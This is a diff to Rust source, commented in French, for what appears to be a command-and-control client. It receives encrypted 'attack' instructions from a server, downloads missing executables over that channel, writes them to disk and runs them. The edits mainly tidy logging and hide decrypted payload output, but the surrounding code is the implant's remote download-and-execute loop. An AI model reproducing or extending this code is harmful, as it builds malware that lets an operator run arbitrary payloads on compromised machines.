@@ -103,7 +103,8 @@ fn receive_encrypted_data_from_server(
         Ok(data) => {
             println!("Data received successfully!");
 
-            println!("Data received: {:?}", data);
+            // println!("Data received: {:?}", data);
+            println!("Data len : {}", data.len().to_string());
 
             let mut buffer = vec![0u8; data.len() + 16];
             match Aes128CbcDec::new(&symetric_key, &iv)
@@ -111,7 +112,7 @@ fn receive_encrypted_data_from_server(
             {
                 Ok(decrypted_data) => { 
                     // Debug: Affiche les données décryptées
-                    println!("Decrypted data: {:?}", decrypted_data);
+                    // println!("Decrypted data: {:?}", decrypted_data);
 
                     decrypted_data.to_vec()
 
@@ -169,25 +170,26 @@ fn check_and_request_executable(
     let executable_path = Path::new(executable_dir).join(executable_name).with_extension("exe");
 
     #[cfg(client_os = "linux")]
-    let executable_path = Path::new(executable_dir).join(executable_name).with_extension("sh");
+    let executable_path = Path::new(executable_dir).join(executable_name);
     
-    println!("Checking if executable exists at {:?}", executable_path);
+    println!("\t[?] Checking if executable exists at {:?}", executable_path);
 
     if !executable_path.exists() {
-        println!("Executable not found, requesting from server...");
+        println!("\t[!] Executable not found, requesting from server...");
 
         let request_message = format!("REQUEST_EXECUTABLE {}", executable_name);
         send_encrypted_string_to_server(sender.clone(), request_message, symetric_key.clone(), iv.clone());
+        println!("\t\t[+] Request sent");
 
         let data_file = receive_encrypted_data_from_server(receiver, symetric_key.clone(), iv.clone());
-        println!("Data file : {:?}", data_file);
+        println!("\t\t[+] data received");
 
         let mut file = File::create(&executable_path)?;
         file.write_all(&data_file)?;
 
-        println!("Executable received and stored at {:?}", executable_path);
+        println!("\t\t[+] Executable received and stored at {:?}", executable_path);
     } else {
-        println!("Executable found at {:?}", executable_path);
+        println!("\t[+] Executable found at {:?}", executable_path);
         send_encrypted_string_to_server(sender.clone(), "YES".to_string(), symetric_key.clone(), iv.clone());
     }
 
@@ -209,7 +211,7 @@ fn execute_attack(
     let executable_path = Path::new(executable_dir).join(attack_name).with_extension("exe");
 
     #[cfg(client_os = "linux")]
-    let executable_path = Path::new(executable_dir).join(attack_name).with_extension("sh");
+    let executable_path = Path::new(executable_dir).join(attack_name);
 
     std::process::Command::new(executable_path).spawn()?.wait()?;
 
@@ -235,7 +237,7 @@ fn main() -> io::Result<()> {
     });
 
     // ========== HANDSHAKE ==========
-
+    println!("[+] starting Handshake");
     // Génération de la paire de clés RSA
     let mut rng = OsRng;
     let bits = 2048;
@@ -294,6 +296,8 @@ fn main() -> io::Result<()> {
 
     send_encrypted_string_to_server(sender.clone(), handshake_response, symetric_key.clone(), iv.clone());
 
+    println!("[+] end Handshake");
+
     // ========== END HANDSHAKE ==========
 
     let _thread_test = thread::spawn(move || {
@@ -303,10 +307,11 @@ fn main() -> io::Result<()> {
             let message = receive_encrypted_string_from_server(&receiver, symetric_key.clone(), iv.clone());
 
             if let Ok(json_attack) = json_to_struct_attack(message.clone()) {
-                println!("Type d'attaque : {:?}", json_attack.attack);
+                println!("[?] instruction reçue : {}", json_attack.attack);
+
                 let id_attack = json_attack.id;
 
-                println!("Received command: {}", message);
+                // println!("Received command: {}", message);
                 match execute_attack(&json_attack.attack, &sender, &receiver, &symetric_key, &iv) {
                     Ok(_) => {
                         let response = format!("{{\"status\":\"success\",\"id\":\"{}\"}}", id_attack);
